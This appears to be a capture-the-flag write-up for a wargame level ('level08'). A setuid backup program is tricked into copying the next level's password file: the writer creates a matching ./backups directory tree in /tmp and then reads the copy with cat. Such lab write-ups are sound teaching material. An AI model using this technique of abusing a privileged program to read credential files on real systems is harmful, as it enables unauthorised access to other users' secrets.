# Level08

## Observations

We can run the program to backup a file in the current working directory.

```shell
$ ./level08 .bashrc
$ diff .bashrc ./backups/.bashrc
```

But only for files in pwd.

```shell
$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

It fails because the path ./backups//home/users/level09 doesn't exit.
We just need to run the program with a folder ./backups//home/users/level09 aside.

## Exploit

We can go in /tmp to create the directory ./backups//home/users/level09

```shell
$ cd /tmp
$ mkdir -p ./backups//home/users/level09
$ $HOME/level08 /home/users/level09/.pass
$ cat ./backups/home/users/level09/.pass
```
